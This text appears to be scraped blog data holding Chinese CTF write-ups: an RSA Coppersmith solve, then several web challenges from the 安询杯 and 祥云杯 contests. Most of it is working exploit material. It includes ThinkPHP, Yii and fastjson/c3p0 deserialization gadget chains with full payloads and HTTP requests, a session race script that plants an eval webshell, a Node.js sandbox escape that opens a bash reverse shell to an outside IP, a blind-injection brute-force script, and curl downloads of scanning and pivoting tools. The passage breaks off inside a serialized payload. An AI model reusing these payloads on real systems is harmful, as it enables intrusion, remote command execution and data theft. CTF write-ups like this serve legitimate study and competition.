n,c,m2,hint=[13002904520196087913175026378157676218772224961198751789793139372975952998874109513709715017379230449514880674554473551508221946249854541352973100832075633211148140972925579736088058214014993082226530875284219933922497736077346225464349174819075866774069797318066487496627589111652333814065053663974480486379799102403118744672956634588445292675676671957278976483815342400168310432107890845293789670795394151784569722676109573685451673961309951157399183944789163591809561790491021872748674809148737825709985578568373545210653290368264452963080533949168735319775945818152681754882108865201849467932032981615400210529003, 8560367979088389639093355670052955344968008917787780010833158290316540154791612927595480968370338549837249823871244436946889198677945456273317343886485741297260557172704718731809632734567349815338988169177983222118718585249696953103962537942023413748690596354436063345873831550109098151014332237310265412976776977183110431262893144552042116871747127301026195142320678244525719655551498368460837394436842924713450715998795899172774573341189660227254331656916960984157772527015479797004423165812493802730996272276613362505737536007284308929288293814697988968407777480072409184261544708820877153825470988634588666018802, 9869907877594701353175281930839281485694004896356038595955883788511764488228640164047958227861871572990960024485992, 9989639419782222444529129951526723618831672627603783728728767345257941311870269471651907118545783408295856954214259681421943807855554571179619485975143945972545328763519931371552573980829950864711586524281634114102102055299443001677757487698347910133933036008103313525651192020921231290560979831996376634906893793239834172305304964022881699764957699708192080739949462316844091240219351646138447816969994625883377800662643645172691649337353080140418336425506119542396319376821324619330083174008060351210307698279022584862990749963452589922185709026197210591472680780996507882639014068600165049839680108974873361895144]h=[int(i) for i in bin(hint)[2:]]hhh=hh_l=len(bin(hint)[2:])#m_l为m,hint都为1的部分m_l=[int(i) for i in bin(m2)[2:].zfill(h_l)]print(len(m_l))'''hint=0for i in range(len(h)): hint+=h[i]*pow(2,len(h)-i-1)print(hint)def decrypt(n,e,c,mbar,kbits): beta = 1 nbits = n.nbits() PR.&lt;x&gt; = PolynomialRing(Zmod(n)) f = (mbar + x)^e - c x0 = f.small_roots(X=2^kbits, beta=1)[0] print(x0) e = 3mbar = 9989639419782222444529129951526723618831672627603783728728767345257941311870269471651907118545783408295856954214259681421943807855554571179619485975143945972545328763519931371552573980829950864711586524281634114102102055299443001677757487698347910133933036008103313525651192020921231290560979831996376634906893793239834172305304964022881699764957699708192080739949462316844091240219351646138447816969994625883377800662643645172691649337353080140418336425506119542396319376821324619330083174008060351210307698279022584862990749963452589922185709026197210591472680780996507882639014068600165049839680108974873361895144kbits =400decrypt(n,e,c,mbar,kbits)'''##hh为有一个为1hh=625351281758775854436696750193519647852347112455593164676552831622184938221557439012947515328144260585439847522581hh=[int(i) for i in bin(hh)[2:].zfill(h_l)]'''for i in range(h_l): if hh[i]==1 and h[i]==1: print('error') else: hhh[i]=hh[i]'''#hhh是有一个为1的部分m=[0 for i in range(h_l)]for i in range(h_l): if m_l[i]==1: m[i]=1 if h[i]==0 and hh[i]==1: m[i]=1from Crypto.Util.number import * print(long_to_bytes(int(''.join(map(str,m)),2))) #D0g3{R54_f4l1_1n_l0ve_with_CopperSmith_w0wow0!!} WebEz_TP存在文件泄露 www.zip \\application\\index\\controller\\Index.php &lt;?phpnamespace app\\index\\controller;use think\\Controller;class Index extends controller{ public function index() { return '&lt;style type=&quot;text/css&quot;&gt;*{ padding: 0; margin: 0; } div{ padding: 4px 48px;} a{color:#2E5CD5;cursor: pointer;text-decoration: none} a:hover{text-decoration:underline; } body{ background: #fff; font-family: &quot;Century Gothic&quot;,&quot;Microsoft yahei&quot;; color: #333;font-size:18px;} h1{ font-size: 100px; font-weight: normal; margin-bottom: 12px; } p{ line-height: 1.6em; font-size: 42px }&lt;/style&gt;&lt;div style=&quot;padding: 24px 48px;&quot;&gt; &lt;h1&gt;:) &lt;/h1&gt;&lt;p&gt; ThinkPHP V5.1&lt;br/&gt;&lt;span style=&quot;font-size:30px&quot;&gt;12载初心不改（2006-2018） - 你值得信赖的PHP框架&lt;/span&gt;&lt;/p&gt;&lt;/div&gt;&lt;script type=&quot;text/javascript&quot; src=&quot;https://tajs.qq.com/stats?sId=64890268&quot; charset=&quot;UTF-8&quot;&gt;&lt;/script&gt;&lt;script type=&quot;text/javascript&quot; src=&quot;https://e.topthink.com/Public/static/client.js&quot;&gt;&lt;/script&gt;&lt;think id=&quot;eab4b9f840753f8e7&quot;&gt;&lt;/think&gt;'; } public function hello() { highlight_file(__FILE__); $hello = base64_encode('Welcome to D0g3'); if (isset($_GET['hello'])||isset($_POST['hello'])) exit; if(isset($_REQUEST['world'])) { parse_str($_REQUEST['world'],$haha); extract($haha); } if (!isset($a)) { $a = 'hello.txt'; } $s = base64_decode($hello); file_put_contents('hello.txt', $s); if(isset($a)) { echo (file_get_contents($a)); } }} 可以通过world注册变量，覆盖$a，$hello。 鉴于题目环境是5.1.37，应该是通过file_get_contents触发phar反序列化。 实测直接phar会报错，限制了数据大小，考虑通过其他格式触发 poc： &lt;?phpnamespace think;abstract class Model{ protected $append = []; private $data = []; function __construct(){ $this-&gt;append = [&quot;lin&quot;=&gt;[&quot;calc.exe&quot;,&quot;calc&quot;]]; $this-&gt;data = [&quot;lin&quot;=&gt;new Request()]; }}class Request{ protected $hook = []; protected $filter = &quot;system&quot;; protected $config = [ // 表单ajax伪装变量 'var_ajax' =&gt; '_ajax', ]; function __construct(){ $this-&gt;filter = &quot;system&quot;; $this-&gt;config = [&quot;var_ajax&quot;=&gt;'lin']; $this-&gt;hook = [&quot;visible&quot;=&gt;[$this,&quot;isAjax&quot;]]; }}namespace think\\process\\pipes;use think\\model\\concern\\Conversion;use think\\model\\Pivot;class Windows{ private $files = []; public function __construct() { $this-&gt;files=[new Pivot()]; }}namespace think\\model;use think\\Model;class Pivot extends Model{}use think\\process\\pipes\\Windows;echo base64_encode(serialize(new Windows()));//TzoyNzoidGhpbmtccHJvY2Vzc1xwaXBlc1xXaW5kb3dzIjoxOntzOjM0OiIAdGhpbmtccHJvY2Vzc1xwaXBlc1xXaW5kb3dzAGZpbGVzIjthOjE6e2k6MDtPOjE3OiJ0aGlua1xtb2RlbFxQaXZvdCI6Mjp7czo5OiIAKgBhcHBlbmQiO2E6MTp7czozOiJsaW4iO2E6Mjp7aTowO3M6ODoiY2FsYy5leGUiO2k6MTtzOjQ6ImNhbGMiO319czoxNzoiAHRoaW5rXE1vZGVsAGRhdGEiO2E6MTp7czozOiJsaW4iO086MTM6InRoaW5rXFJlcXVlc3QiOjM6e3M6NzoiACoAaG9vayI7YToxOntzOjc6InZpc2libGUiO2E6Mjp7aTowO3I6OTtpOjE7czo2OiJpc0FqYXgiO319czo5OiIAKgBmaWx0ZXIiO3M6Njoic3lzdGVtIjtzOjk6IgAqAGNvbmZpZyI7YToxOntzOjg6InZhcl9hamF4IjtzOjM6ImxpbiI7fX19fX19?&gt; 将序列化内容写入zip注释，需要对特殊字符进行替换 &lt;?php//bypass %00function process_serialized($serialized) { $new = ''; $last = 0; $current = 0; $pattern = '#\\bs:([0-9]+):&quot;#'; while( $current &lt; strlen($serialized) &amp;&amp; preg_match( $pattern, $serialized, $matches, PREG_OFFSET_CAPTURE, $current ) ) { $p_start = $matches[0][1]; $p_start_string = $p_start + strlen($matches[0][0]); $length = $matches[1][0]; $p_end_string = $p_start_string + $length; # Check if this really is a serialized string if(!( strlen($serialized) &gt; $p_end_string + 2 &amp;&amp; substr($serialized, $p_end_string, 2) == '&quot;;' )) { $current = $p_start_string; continue; } $string = substr($serialized, $p_start_string, $length); # Convert every special character to its S representation $clean_string = ''; for($i=0; $i &lt; strlen($string); $i++) { $letter = $string{$i}; $clean_string .= ctype_print($letter) &amp;&amp; $letter != '\\\\' ? $letter : sprintf(&quot;\\\\%02x&quot;, ord($letter)); ; } # Make the replacement $new .= substr($serialized, $last, $p_start - $last) . 'S:' . $matches[1][0] . ':&quot;' . $clean_string . '&quot;;' ; $last = $p_end_string + 2; $current = $last; } $new .= substr($serialized, $last); return $new;} 生成zip文件 &lt;?phpinclude (&quot;test4.php&quot;);$p = &quot;TzoyNzoidGhpbmtccHJvY2Vzc1xwaXBlc1xXaW5kb3dzIjoxOntzOjM0OiIAdGhpbmtccHJvY2Vzc1xwaXBlc1xXaW5kb3dzAGZpbGVzIjthOjE6e2k6MDtPOjE3OiJ0aGlua1xtb2RlbFxQaXZvdCI6Mjp7czo5OiIAKgBhcHBlbmQiO2E6MTp7czozOiJsaW4iO2E6Mjp7aTowO3M6ODoiY2FsYy5leGUiO2k6MTtzOjQ6ImNhbGMiO319czoxNzoiAHRoaW5rXE1vZGVsAGRhdGEiO2E6MTp7czozOiJsaW4iO086MTM6InRoaW5rXFJlcXVlc3QiOjM6e3M6NzoiACoAaG9vayI7YToxOntzOjc6InZpc2libGUiO2E6Mjp7aTowO3I6OTtpOjE7czo2OiJpc0FqYXgiO319czo5OiIAKgBmaWx0ZXIiO3M6Njoic3lzdGVtIjtzOjk6IgAqAGNvbmZpZyI7YToxOntzOjg6InZhcl9hamF4IjtzOjM6ImxpbiI7fX19fX19&quot;;$b = base64_decode($p);echo process_serialized($b);$b = process_serialized($b);$zip = new ZipArchive();$res = $zip-&gt;open('2.zip',ZipArchive::CREATE);$zip-&gt;addFromString('ttt.txt', 'ttt');$zip-&gt;setArchiveComment($b);$zip-&gt;close(); 读入zip文件并做加密编码 echo urlencode(base64_encode(file_get_contents(&quot;2.zip&quot;))); 请求获取flag： POST /?s=/index/index/hello&amp;lin=cat+/y0u_f0und_It HTTP/1.1Host: 1.12.220.15:19274Upgrade-Insecure-Requests: 1User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.85 Safari/537.36Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9Accept-Encoding: gzip, deflateAccept-Language: zh-CN,zh;q=0.9Content-Type: application/x-www-form-urlencodedConnection: closeContent-Length: 773world=a=phar://hello.txt/ttt.txt%26hello=UEsDBAoAAAAAAC6Me1NJEIKwAwAAAAMAAAAHAAAAdHR0LnR4dHR0dFBLAQI%2FAwoAAAAAAC6Me1NJEIKwAwAAAAMAAAAHAAAAAAAAAAAAAAC2gQAAAAB0dHQudHh0UEsFBgAAAAABAAEANQAAACgAAACvAU86Mjc6InRoaW5rXHByb2Nlc3NccGlwZXNcV2luZG93cyI6MTp7UzozNDoiXDAwdGhpbmtcNWNwcm9jZXNzXDVjcGlwZXNcNWNXaW5kb3dzXDAwZmlsZXMiO2E6MTp7aTowO086MTc6InRoaW5rXG1vZGVsXFBpdm90IjoyOntTOjk6IlwwMCpcMDBhcHBlbmQiO2E6MTp7UzozOiJsaW4iO2E6Mjp7aTowO1M6ODoiY2FsYy5leGUiO2k6MTtTOjQ6ImNhbGMiO319UzoxNzoiXDAwdGhpbmtcNWNNb2RlbFwwMGRhdGEiO2E6MTp7UzozOiJsaW4iO086MTM6InRoaW5rXFJlcXVlc3QiOjM6e1M6NzoiXDAwKlwwMGhvb2siO2E6MTp7Uzo3OiJ2aXNpYmxlIjthOjI6e2k6MDtyOjk7aToxO1M6NjoiaXNBamF4Ijt9fVM6OToiXDAwKlwwMGZpbHRlciI7Uzo2OiJzeXN0ZW0iO1M6OToiXDAwKlwwMGNvbmZpZyI7YToxOntTOjg6InZhcl9hamF4IjtTOjM6ImxpbiI7fX19fX19 补充：线下战报安询杯线下决赛取得第二名，获得一等奖。","link":"/posts/4906/"},{"title":"2021第二届祥云杯WP","text":"2021第二届祥云杯WP n03tAck战队成员为各个大学的学生，部分战队成员不可能只以n03tAck身份参赛，所以成员作为自身学校的正常组队行为与n03tAck无任何关系，此WP由赛后各个成员汇集而成。 Webezyii考点：yii反序列化链子 相关利用的类都发出来了，感觉不像CMS的审计，更像是POP链的构造。 &lt;?phpnamespace Codeception\\Extension{ use Faker\\DefaultGenerator; use GuzzleHttp\\Psr7\\AppendStream; class RunProcess{ protected $output; private $processes = []; public function __construct(){ $this-&gt;processes[]=new DefaultGenerator(new AppendStream()); $this-&gt;output=new DefaultGenerator('atao'); } } echo base64_encode(serialize(new RunProcess()));}namespace Faker{ class DefaultGenerator{ protected $default; public function __construct($default = null) { $this-&gt;default = $default;}}}namespace GuzzleHttp\\Psr7{ use Faker\\DefaultGenerator; final class AppendStream{ private $streams = []; private $seekable = true; public function __construct(){ $this-&gt;streams[]=new CachingStream(); } } final class CachingStream{ private $remoteStream; public function __construct(){ $this-&gt;remoteStream=new DefaultGenerator(false); $this-&gt;stream=new PumpStream(); } } final class PumpStream{ private $source; private $size=-10; private $buffer; public function __construct(){ $this-&gt;buffer=new DefaultGenerator('j'); include(&quot;closure/autoload.php&quot;); $a = function(){system('cat /flag.txt');phpinfo(); }; $a = \\Opis\\Closure\\serialize($a); $b = unserialize($a); $this-&gt;source=$b; } }}#payload:TzozMjoiQ29kZWNlcHRpb25cRXh0ZW5zaW9uXFJ1blByb2Nlc3MiOjI6e3M6OToiACoAb3V0cHV0IjtPOjIyOiJGYWtlclxEZWZhdWx0R2VuZXJhdG9yIjoxOntzOjEwOiIAKgBkZWZhdWx0IjtzOjQ6ImF0YW8iO31zOjQzOiIAQ29kZWNlcHRpb25cRXh0ZW5zaW9uXFJ1blByb2Nlc3MAcHJvY2Vzc2VzIjthOjE6e2k6MDtPOjIyOiJGYWtlclxEZWZhdWx0R2VuZXJhdG9yIjoxOntzOjEwOiIAKgBkZWZhdWx0IjtPOjI4OiJHdXp6bGVIdHRwXFBzcjdcQXBwZW5kU3RyZWFtIjoyOntzOjM3OiIAR3V6emxlSHR0cFxQc3I3XEFwcGVuZFN0cmVhbQBzdHJlYW1zIjthOjE6e2k6MDtPOjI5OiJHdXp6bGVIdHRwXFBzcjdcQ2FjaGluZ1N0cmVhbSI6Mjp7czo0MzoiAEd1enpsZUh0dHBcUHNyN1xDYWNoaW5nU3RyZWFtAHJlbW90ZVN0cmVhbSI7TzoyMjoiRmFrZXJcRGVmYXVsdEdlbmVyYXRvciI6MTp7czoxMDoiACoAZGVmYXVsdCI7YjowO31zOjY6InN0cmVhbSI7TzoyNjoiR3V6emxlSHR0cFxQc3I3XFB1bXBTdHJlYW0iOjM6e3M6MzQ6IgBHdXp6bGVIdHRwXFBzcjdcUHVtcFN0cmVhbQBzb3VyY2UiO0M6MzI6Ik9waXNcQ2xvc3VyZVxTZXJpYWxpemFibGVDbG9zdXJlIjoyMDQ6e2E6NTp7czozOiJ1c2UiO2E6MDp7fXM6ODoiZnVuY3Rpb24iO3M6NDk6ImZ1bmN0aW9uKCl7XHN5c3RlbSgnY2F0IC9mbGFnLnR4dCcpO1xwaHBpbmZvKCk7CX0iO3M6NToic2NvcGUiO3M6MjY6Ikd1enpsZUh0dHBcUHNyN1xQdW1wU3RyZWFtIjtzOjQ6InRoaXMiO047czo0OiJzZWxmIjtzOjMyOiIwMDAwMDAwMDA5MTZlM2VmMDAwMDAwMDA2NmFhYWNiYSI7fX1zOjMyOiIAR3V6emxlSHR0cFxQc3I3XFB1bXBTdHJlYW0Ac2l6ZSI7aTotMTA7czozNDoiAEd1enpsZUh0dHBcUHNyN1xQdW1wU3RyZWFtAGJ1ZmZlciI7TzoyMjoiRmFrZXJcRGVmYXVsdEdlbmVyYXRvciI6MTp7czoxMDoiACoAZGVmYXVsdCI7czoxOiJqIjt9fX19czozODoiAEd1enpsZUh0dHBcUHNyN1xBcHBlbmRTdHJlYW0Ac2Vla2FibGUiO2I6MTt9fX19 flag{bc862289-85e9-48d8-9dd5-fc27162566ff} 安全检测考点：SSRF、session条件竞争 随意用户名都可以登陆，接着是SSRF的内容，通过访问http://127.0.0.1/admin/，获得include123.php文件 接着访问http://127.0.0.1/admin/include123.php，获取源码 根据过滤了内容， 可以知道是session条件竞争 import ioimport requestsimport threadingsess_id = 'Atao'def write(session): while True: f = io.BytesIO(b'a' * 1024 * 128) session.post(url='http://eci-2ze7cuv076c4risfr6z3.cloudeci1.ichunqiu.com', data={'PHP_SESSION_UPLOAD_PROGRESS': 'aaaaasdasdasd&lt;?php phpinfo();file_put_contents(&quot;/tmp/1&quot;,&quot;&lt;?php eval(base64_decode(\\$_GET[1]));phpinfo();?&gt;&quot;);?&gt;'}, files={'file': ('atao.txt',f)}, cookies={'PHPSESSID': sess_id} )if __name__==&quot;__main__&quot;: event = threading.Event() session = requests.session() for i in range(1,80): threading.Thread(target=write,args=(session,)).start() 接着去访问http://127.0.0.1/admin/include123.php?u=/tmp/sess_Atao，访问到回显了phpinfo即可 这里写入/tmp/1一句话木马，接着访问http://127.0.0.1/admin/include123.php?u=/tmp/1&amp;1=c3lzdGVtKCIvZ2V0ZmxhZy5zaCIpOw==即可获得flag crawler_z考点：zombie的Nday漏洞、变量覆盖 从图一可知，personalBucket要和bucket的变量相同，图二中，personalBucket又会赋给user.bucket。所以这里我们可以发三次请求，第一次：正常请求主要是为了获得token值；第二次：上传exp的IP地址为了修改personalBucket内容；第三次：通过/user/verify？token=覆盖user.bucket 这里还有一个需要绕过的地方，在IP的结尾要跟上oss-cn-beijing.ichunqiu.com，如http://IP/index.html?aaa=oss-cn-beijing.ichunqiu.com即可。 &lt;script&gt;c='constructor';this[c][c](&quot;c='constructor';require=this[c][c]('return process')().mainModule.require;var sync=require('child_process').spawnSync; var ls = sync('bash', ['-c','bash -i &gt;&amp; /dev/tcp/47.98.147.229/7777 0&gt;&amp;1'],);console.log(ls.output.toString());&quot;)()&lt;/script&gt; 把上面的代码放在vps的index.html，zombie Nday漏洞参考链接：https://ha.cker.in/index.php/Article/13563 最后通过/user/bucket路由反弹shell，执行/readflag命令 PackageManager2021考点：SQL注入 通过审计源码，发现此处存在SQL注入的漏洞，可以通过构造00f355689f5b7cb21e2a34346d9c55cd&quot;||(this.username==&quot;admin&quot;&amp;&amp;this.password[i]==&quot;j&quot;)||this.username==&quot;123的Payload进行注入，获得admin用户的密码 上图可知，存在Bool盲注，这里最后的this.username为我们一开始注册的账户 import requests# b!@#$d5dh47jyfz#098crw*wflag = &quot;&quot;for i in range(0,50): for j in range(32,127): burp0_url = &quot;http://47.104.108.80:8888/auth&quot; burp0_cookies = {&quot;session&quot;: &quot;s%3Adq6vnQaD6PED4EhGg1tTvmpLa1FpJrUO.ATo3wP4XqidqLO0TbwAchNH41OxUxFFjF7KFNDKzVDs&quot;} burp0_headers = {&quot;User-Agent&quot;: &quot;Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:91.0) Gecko/20100101 Firefox/91.0&quot;, &quot;Accept&quot;: &quot;text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8&quot;, &quot;Accept-Language&quot;: &quot;zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2&quot;, &quot;Accept-Encoding&quot;: &quot;gzip, deflate&quot;, &quot;Content-Type&quot;: &quot;application/x-www-form-urlencoded&quot;, &quot;Origin&quot;: &quot;http://47.104.108.80:8888&quot;, &quot;Connection&quot;: &quot;close&quot;, &quot;Referer&quot;: &quot;http://47.104.108.80:8888/auth&quot;, &quot;Upgrade-Insecure-Requests&quot;: &quot;1&quot;} burp0_data = {&quot;_csrf&quot;: &quot;otezaj5Q-ZVimOBu-Aiw82rOf_hKkqlkbrvE&quot;, &quot;token&quot;: &quot;00f355689f5b7cb21e2a34346d9c55cd\\&quot;||(this.username==\\&quot;admin\\&quot;&amp;&amp;this.password[{}]==\\&quot;{}\\&quot;)||this.username==\\&quot;123&quot;.format(i,chr(j))} res = requests.post(burp0_url, headers=burp0_headers, cookies=burp0_cookies, data=burp0_data) print str(i)+&quot;:&quot;+chr(j) if &quot;No matching results&quot; in res.text: flag += chr(j) print flag break if j == 126: exit(0) 从上图可知admin的password，登陆了admin用户就可以获得flag了，flag为flag{407bb420-7845-4722-a322-f3f11b5bf09f} 层层穿透考点：Apache Flink 任意 Jar 包上传导致远程代码执行漏洞+fastjson反序列化 首先是：Apache Flink 任意 Jar 包上传导致远程代码执行漏洞 有现成的脚本：https://github.com/LandGrey/flink-unauth-rce 但是一直无法连接shell，可能是连接的人太多了，于是就改了一下脚本，直接在vps一直监听着，然后脚本一直跑着，等着环境重启，终于连接上了，然后并没有找到flag，再加上题目说了内网地址，所以怀疑还有内网环境，于是下载fscan（ https://github.com/shadow1ng/fscan ）扫描了一波，发现存在内网环境 进入tmp目录，使用curl下载fscan，我放到我自己的vps上 curl http://81.70.105.149/fscan_amd64 &gt;&gt; fscan_amd64 然后赋予权限 chmod 777 fscan_amd64 然后进行扫描 ./fscan_amd64 -h 10.10.1.1/24 扫描结果 发现内网 10.10.1.11 存在Shiro SprintBoot 于是就想着转发出来比较方便，继续下载了portmap( http://www.vuln.cn/wp-content/uploads/2016/06/lcx_vuln.cn_.zip ），我也是现将文件放至自己的vps然后使用curl下载 curl http://81.70.105.149/portmap &gt;&gt; portmap 然后也是赋予权限 chmod 777 portmap 然后在vps上运行，就是将5567端口的数据转发至8005端口 ./portmap -m 2 -p1 5567 -p2 8005 然后再在靶机上运行，将内网环境转发出来 ./portmap -m 3 -h1 81.70.105.149 -p1 5567 -h2 10.10.1.11 -p2 8080 运行结果 vps 靶机 然后就可以在公网访问了 题目提供了源码，下载下来，使用jd-gui反编译查看一下 账号密码为 admin / 123456 还发现了fastjson，但是有waf，需要绕过 然后再lib里发现了 hibernate-c3p0-5.3.14.Final.jar 在githun上面找到了绕过方式，c3p0反序列化（https://github.com/depycode/fastjson-c3p0） readme里面有说明 要想反序列化需要想登陆获取cookie，所以先登录 获取到cookie后bp抓包，修改数据包，直接将利用链复制粘贴，然后直接粘贴的话就会回显太短 因为对传入的长度进行了判断 所以直接就再填充2w的数据即可，最后的payload如下： POST /admin/test HTTP/1.1Host: 81.70.105.149:8005Upgrade-Insecure-Requests: 1User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/75.0.3770.142 Safari/537.36Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3Accept-Encoding: gzip, deflatecmd: cat /flagAccept-Language: zh-CN,zh;q=0.9Connection: closeContent-Type: application/jsonContent-Length: 28963Cookie: d0c13ba04d29a2c666096db3206682c8=6f2998af-b14a-4ebc-9002-eea46873c544.KgKniEGW1GMEX6nqT4eQLtFMsXQ; request_token=8c7wo37zB5OkLDIpgnqfuht93rbWqTEjsLvir0wS0soYk8XE; pro_end=-1; ltd_end=-1; serverType=apache; order=id%20desc; memSize=1838; bt_user_info=%7B%22status%22%3Atrue%2C%22msg%22%3A%22%u83B7%u53D6%u6210%u529F%21%22%2C%22data%22%3A%7B%22username%22%3A%22158****9824%22%7D%7D; rank=list; Path=/www/wwwroot/myweb; file_recycle_status=true; JSESSIONID=4A2824342782C0A7393AF8ACF226F26B{&quot;e&quot;:{&quot;@type&quot;:&quot;java.lang.Class&quot;,&quot;val&quot;:&quot;com.mchange.v2.c3p0.WrapperConnectionPoolDataSource&quot;},&quot;f&quot;:{&quot;@type&quot;:&quot;com.mchange.v2.c3p0.WrapperConnectionPoolDataSource&quot;,&quot;userOverridesAsString&quot;:&quot;HexAsciiSerializedMap:ACED0005737200116A6176612E7574696C2E48617368536574BA44859596B8B7340300007870770C000000103F400000000000027372002A6F72672E6170616368652E636F6D6D6F6E732E636F6C6C656374696F6E732E6D61702E4C617A794D61706EE594829E7910940300014C0007666163746F727974002C4C6F72672F6170616368652F636F6D6D6F6E732F636F6C6C656374696F6E732F5472616E73666F726D65723B78707372003A6F72672E6170616368652E636F6D6D6F6E732E636F6C6C656374696F6E732E66756E63746F72732E496E766F6B65725472616E73666F726D657287E8FF6B7B7CCE380200035B000569417267737400135B4C6A6176612F6C616E672F4F626A6563743B4C000B694D6574686F644E616D657400124C6A6176612F6C616E672F537472696E673B5B000B69506172616D54797065737400125B4C6A6176612F6C616E672F436C6173733B7870707400136765744F757470757450726F7065727469657370737200116A6176612E7574696C2E486173684D61700507DAC1C31660D103000246000A6C6F6164466163746F724900097468726573686F6C6478703F4000000000000C770800000010000000017371007E000B3F4000000000000C770800000010000000017372003A636F6D2E73756E2E6F72672E6170616368652E78616C616E2E696E7465726E616C2E78736C74632E747261782E54656D706C61746573496D706C09574FC16EACAB3303000649000D5F696E64656E744E756D62657249000E5F7472616E736C6574496E6465785B000A5F62797465636F6465737400035B5B425B00065F636C61737371007E00084C00055F6E616D6571007E00074C00115F6F757470757450726F706572746965737400164C6A6176612F7574696C2F50726F706572746965733B787000000000FFFFFFFF757200035B5B424BFD19156767DB37020000787000000001757200025B42ACF317F8060854E0020000787000000DCFCAFEBABE0000003400CD0A0014005F090033006009003300610700620A0004005F09003300630A006400650A003300660A000400670A000400680A0033006907006A0A0014006B0A0012006C08006D0B000C006E08006F0700700A001200710700720A007300740700750700760700770800780A0079007A0A0018007B08007C0A0018007D08007E08007F0800800B001600810700820A008300840A008300850A008600870A002200880800890A0022008A0A0022008B0A008C008D0A008C008E0A0012008F0A009000910A009000920A001200930A003300940700950A00120096070097010001680100134C6A6176612F7574696C2F486173685365743B0100095369676E61747572650100274C6A6176612F7574696C2F486173685365743C4C6A6176612F6C616E672F4F626A6563743B3E3B010001720100274C6A617661782F736572766C65742F687474702F48747470536572766C6574526571756573743B010001700100284C6A617661782F736572766C65742F687474702F48747470536572766C6574526573706F6E73653B0100063C696E69743E010003282956010004436F646501000F4C696E654E756D6265725461626C650100124C6F63616C5661726961626C655461626C65010004746869730100204C79736F73657269616C2F7061796C6F6164732F436F6D6D6F6E4563686F313B01000169010015284C6A6176612F6C616E672F4F626A6563743B295A0100036F626A0100124C6A6176612F6C616E672F4F626A6563743B01000D537461636B4D61705461626C65010016284C6A6176612F6C616E672F4F626A6563743B492956010001650100154C6A6176612F6C616E672F457863657074696F6E3B010008636F6D6D616E64730100135B4C6A6176612F6C616E672F537472696E673B0100016F01000564657074680100014907007607004C070072010001460100017101000D6465636C617265644669656C640100194C6A6176612F6C616E672F7265666C6563742F4669656C643B01000573746172740100016E0100114C6A6176612F6C616E672F436C6173733B07007007009807009901000A536F7572636546696C65010010436F6D6D6F6E4563686F312E6A6176610C003C003D0C003800390C003A003B0100116A6176612F7574696C2F486173685365740C0034003507009A0C009B009C0C005300480C009D00440C009E00440C004300440100256A617661782F736572766C65742F687474702F48747470536572766C6574526571756573740C009F00A00C00A100A2010003636D640C00A300A401000B676574526573706F6E736501000F6A6176612F6C616E672F436C6173730C00A500A60100106A6176612F6C616E672F4F626A6563740700A70C00A800A90100266A617661782F736572766C65742F687474702F48747470536572766C6574526573706F6E73650100136A6176612F6C616E672F457863657074696F6E0100106A6176612F6C616E672F537472696E670100076F732E6E616D650700AA0C00AB00A40C00AC00AD01000357494E0C009D00AE0100022F630100072F62696E2F73680100022D630C00AF00B00100116A6176612F7574696C2F5363616E6E65720700B10C00B200B30C00B400B50700B60C00B700B80C003C00B90100025C410C00BA00BB0C00BC00AD0700BD0C00BE00BF0C00C0003D0C00C100C20700990C00C300C40C00C500C60C00C700C80C003A00480100135B4C6A6176612F6C616E672F4F626A6563743B0C00C900A001001E79736F73657269616C2F7061796C6F6164732F436F6D6D6F6E4563686F3101001A5B4C6A6176612F6C616E672F7265666C6563742F4669656C643B0100176A6176612F6C616E672F7265666C6563742F4669656C640100106A6176612F6C616E672F54687265616401000D63757272656E7454687265616401001428294C6A6176612F6C616E672F5468726561643B010008636F6E7461696E73010003616464010008676574436C61737301001328294C6A6176612F6C616E672F436C6173733B010010697341737369676E61626C6546726F6D010014284C6A6176612F6C616E672F436C6173733B295A010009676574486561646572010026284C6A6176612F6C616E672F537472696E673B294C6A6176612F6C616E672F537472696E673B0100096765744D6574686F64010040284C6A6176612F6C616E672F537472696E673B5B4C6A6176612F6C616E672F436C6173733B294C6A6176612F6C616E672F7265666C6563742F4D6574686F643B0100186A6176612F6C616E672F7265666C6563742F4D6574686F64010006696E766F6B65010039284C6A6176612F6C616E672F4F626A6563743B5B4C6A6176612F6C616E672F4F626A6563743B294C6A6176612F6C616E672F4F626A6563743B0100106A6176612F6C616E672F53797374656D01000B67657450726F706572747901000B746F55707065724361736501001428294C6A6176612F6C616E672F537472696E673B01001B284C6A6176612F6C616E672F4368617253657175656E63653B295A01000967657457726974657201001728294C6A6176612F696F2F5072696E745772697465723B0100116A6176612F6C616E672F52756E74696D6501000A67657452756E74696D6501001528294C6A6176612F6C616E672F52756E74696D653B01000465786563010028285B4C6A6176612F6C616E672F537472696E673B294C6A6176612F6C616E672F50726F636573733B0100116A6176612F6C616E672F50726F6365737301000E676574496E70757453747265616D01001728294C6A6176612F696F2F496E70757453747265616D3B010018284C6A6176612F696F2F496E70757453747265616D3B295601000C75736544656C696D69746572010027284C6A6176612F6C616E672F537472696E673B294C6A6176612F7574696C2F5363616E6E65723B0100046E6578740100136A6176612F696F2F5072696E745772697465720100077072696E746C6E010015284C6A6176612F6C616E672F537472696E673B2956010005666C7573680100116765744465636C617265644669656C647301001C28295B4C6A6176612F6C616E672F7265666C6563742F4669656C643B01000D73657441636365737369626C65010004285A2956010003676574010026284C6A6176612F6C616E672F4F626A6563743B294C6A6176612F6C616E672F4F626A6563743B0100076973417272617901000328295A01000D6765745375706572636C617373010040636F6D2F73756E2F6F72672F6170616368652F78616C616E2F696E7465726E616C2F78736C74632F72756E74696D652F41627374726163745472616E736C65740700CA0A00CB005F0021003300CB000000030008003400350001003600000002003700080038003900000008003A003B000000040001003C003D0001003E0000005C000200010000001E2AB700CC01B3000201B30003BB000459B70005B30006B8000703B80008B100000002003F0000001A0006000000140004001500080016000C001700160018001D001900400000000C00010000001E004100420000000A004300440001003E0000005A000200010000001A2AC6000DB200062AB6000999000504ACB200062AB6000A5703AC00000003003F0000001200040000001D000E001E001000210018002200400000000C00010000001A00450046000000470000000400020E01000A003A00480001003E000001D300050003000000EF1B1034A3000FB20002C6000AB20003C60004B12A